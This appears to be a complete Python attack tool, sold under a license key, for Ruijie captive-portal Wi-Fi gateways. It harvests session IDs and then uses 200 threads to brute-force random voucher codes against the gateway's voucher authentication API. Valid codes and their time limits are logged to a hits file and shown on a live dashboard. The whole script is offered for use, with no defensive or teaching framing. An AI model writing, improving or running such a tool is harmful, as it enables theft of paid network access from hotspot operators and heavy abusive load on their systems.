import requests, random, string, time, os, threading, re, sys, urllib3, subprocess
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime
from colorama import Fore, Back, Style, init

# Colorama initialize
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- [ COLORS ] ---
G = Fore.GREEN; W = Fore.WHITE; Y = Fore.YELLOW; R = Fore.RED; C = Fore.CYAN; RS = Style.RESET_ALL
RAINBOW = [R, Y, G, C, Fore.MAGENTA, Fore.BLUE]

# ===============================
# CONFIGURATION (Original)
# ===============================
RAW_KEY_URL = "Https://raw.githubusercontent.com/kokoarkar446-cloud/voucher/refs/heads/main/keys.txt"
if os.name == 'nt': DOWNLOAD_DIR = os.path.join(os.environ['USERPROFILE'], 'Downloads')
else: DOWNLOAD_DIR = '/sdcard/Download'

# .txt ကို hide ရန် အစက် (.) ထည့်ထားသည် (မူရင်းနေရာကို hide ရုံသာ)
LICENSE_FILE = os.path.join(DOWNLOAD_DIR, '.license.txt')
SAVE_PATH = os.path.join(DOWNLOAD_DIR, 'hits.txt')
STATS_FILE = os.path.join(DOWNLOAD_DIR, 'total_stats.txt')

NUM_THREADS = 200             
SESSION_POOL_SIZE = 50        
PER_SESSION_MAX = 300         
CODE_LENGTH = 6 
CHAR_SET = string.digits 

# ==============================
# GLOBALS (Original Keep)
# ==============================
USER_NAME = "Unknown"
EXPIRY_STR = "N/A"
DAYS_LEFT = "0"
session_pool = Queue()
valid_hits_data = [] 
tried_codes = set()
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_HITS = 0
TOTAL_TRIED = 0
CURRENT_CODE = "WAITING"
START_TIME = time.time()
stop_event = threading.Event()

# Load stats
try:
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE, "r") as f: TOTAL_TRIED = int(f.read().strip())
except: TOTAL_TRIED = 0

# --- [ UI & UTILITY FUNCTIONS ] ---
def get_hwid():
    try: return f"ID-{subprocess.check_output(['whoami']).decode().strip()}"
    except: return "ID-UNKNOWN"

def Draw_logo(step=0):
    os.system('clear')
    clr = RAINBOW[step % len(RAINBOW)]
    print(f"""{clr}
      .---.        .-----------.
     /     \  __  /    v2.0     \\
    / /     \(  )/               \\
   //////   ' \/ `   RUIJIE       \\
  //////    /    \   SCANNER      /
 //////    /      \              /
'------'  '--------'------------'
{W} OWNER : {C}{USER_NAME} {W}| EXP : {Y}{EXPIRY_STR} ({DAYS_LEFT} Days Left){RS}""")

# --- [ VERIFY SYSTEM - FIXED USERNAME DISPLAY ] ---
def verify():
    global USER_NAME, EXPIRY_STR, DAYS_LEFT
    hwid = get_hwid()
    now = datetime.now().date()
    # Offline Check (.license.txt)
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                saved = f.read().strip().split(":")
            if len(saved) >= 3:
                USER_NAME, EXPIRY_STR = saved[1], saved[2]
                exp_date = datetime.strptime(EXPIRY_STR, '%Y-%m-%d').date()
                diff = (exp_date - now).days
                if diff >= 0:
                    DAYS_LEFT = str(diff)
                    return True
                else: os.remove(LICENSE_FILE)
        except: pass
    # Online Check
    Draw_logo()
    try:
        print(f"{W}[*] Connecting to License Server...{RS}")
        resp = requests.get(f"{RAW_KEY_URL}?t={random.random()}", timeout=15).text
        print(f"{W}[+] YOUR DEVICE ID: {Y}{hwid}{RS}")
        key = input(f"{Y}[?] ENTER LICENSE KEY: {RS}").strip()
        for line in resp.splitlines():
            if ":" in line and f"{key}:{hwid}" in line:
                p = line.split(":")
                if len(p) >= 4:
                    USER_NAME, EXPIRY_STR = p[2], p[3]
                    exp_date = datetime.strptime(EXPIRY_STR, '%Y-%m-%d').date()
                    diff = (exp_date - now).days
                    if diff >= 0:
                        DAYS_LEFT = str(diff)
                        with open(LICENSE_FILE, "w") as f:
                            f.write(f"{key}:{USER_NAME}:{EXPIRY_STR}")
                        return True
        return False
    except: return False

def select_mode():
    global CODE_LENGTH, CHAR_SET
    Draw_logo()
    print(f"\n{C}[ SELECT SCAN MODE ]{RS}")
    print(f" {Y}[1]{W} Scan 6-Digit (000000 format)")
    print(f" {Y}[2]{W} Scan 7-Digit")
    print(f" {Y}[3]{W} Scan 8-Digit")
    print(f" {Y}[4]{W} Scan 9-Digit")
    print(f" {Y}[5]{W} Alphanumeric Mode")
    choice = input(f"\n{C}Choose (1-5): {RS}")
    if choice == "2": CODE_LENGTH = 7
    elif choice == "3": CODE_LENGTH = 8
    elif choice == "4": CODE_LENGTH = 9
    elif choice == "5":
        CODE_LENGTH = 6
        CHAR_SET = string.ascii_lowercase + string.digits 
    else: CODE_LENGTH = 6
    time.sleep(1)

# --- [ CORE LOGIC - FIXED WAITING STATUS ] ---
def get_sid_from_gateway():
    global DETECTED_BASE_URL
    s = requests.Session()
    try:
        r1 = s.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        final_url = urljoin(r1.url, path_match.group(1)) if path_match else r1.url
        if path_match:
            r2 = s.get(final_url, timeout=5)
            final_url = r2.url
        parsed = urlparse(final_url)
        DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
        return sid
    except: return None

def session_refiller():
    while not stop_event.is_set():
        try:
            if session_pool.qsize() < SESSION_POOL_SIZE:
                sid = get_sid_from_gateway()
                if sid: session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
            time.sleep(0.5)
        except: time.sleep(2)

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    thr_session = requests.Session()
    while not stop_event.is_set():
        try:
            if not DETECTED_BASE_URL:
                time.sleep(1); continue
            try: slot = session_pool.get(timeout=2)
            except Empty: continue
            
            sid = slot.get('sessionId')
            code = ''.join(random.choices(CHAR_SET, k=CODE_LENGTH))
            CURRENT_CODE = code # Status Update ဖြစ်အောင် ဤနေရာတွင်ထားပါသည်
            
            r = thr_session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
                                 json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
                                 timeout=6)
            TOTAL_TRIED += 1
            
            if "true" in r.text.lower():
                limit_label = "???"
                try:
                    res_data = r.json()
                    limit = res_data.get('timeLimit') or res_data.get('data', {}).get('timeLimit')
                    if limit:
                        sec = int(limit)
                        if sec >= 2592000: limit_label = "1 Month"
                        elif sec >= 86400: limit_label = f"{sec//86400} Day"
                        else: limit_label = f"{round(sec/3600, 1)} Hrs"
                except: pass
                with valid_lock:
                    valid_hits_data.append({"code": code, "hrs": limit_label})
                    TOTAL_HITS += 1
                    with file_lock:
                        with open(SAVE_PATH, "a") as f:
                            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {code} | {limit_label}\n")
            
            slot['left'] -= 1
            if slot['left'] > 0: session_pool.put(slot)
        except: pass

def live_dashboard():
    step = 0
    icons = ["—", "\\", "|", "/"]
    while not stop_event.is_set():
        Draw_logo(step)
        elapsed = time.time() - START_TIME
        speed = (TOTAL_TRIED / elapsed) if elapsed > 0 else 0
        ic = icons[step % 4]
        print(W + "—" * 55)
        print(f"| {W}USER   : {G}{USER_NAME:<15}{RS} {W}EXPIRY : {Y}{EXPIRY_STR}{RS}")
        print(f"| {W}STATUS : {G}ACTIVE {Y}{ic}{RS}      {W}SPEED  : {C}{speed:.1f} codes/s")
        print(f"| {W}DAYS   : {R}{DAYS_LEFT} Days Left{RS}   {W}TIME   : {Y}{datetime.now().strftime('%H:%M:%S')}")
        print(W + "—" * 55)
        print(f"| {W}TOTAL TRIED : {W}{TOTAL_TRIED:,}")
        print(f"| {W}FOUND HITS  : {G}{TOTAL_HITS}")
        print(f"| {W}LAST TARGET : {Y}{CURRENT_CODE}")
        print(W + "—" * 55)
        if valid_hits_data:
            for hit in valid_hits_data[-5:]:
                print(f"  {G}✅ {hit['code']} {Y}({hit['hrs']})")
        step += 1
        time.sleep(0.5)

if __name__ == "__main__":
    if verify(): 
        select_mode()
        threading.Thread(target=session_refiller, daemon=True).start()
        threading.Thread(target=live_dashboard, daemon=True).start()
        for _ in range(NUM_THREADS):
            threading.Thread(target=worker_thread, daemon=True).start()
        while True: time.sleep(1)
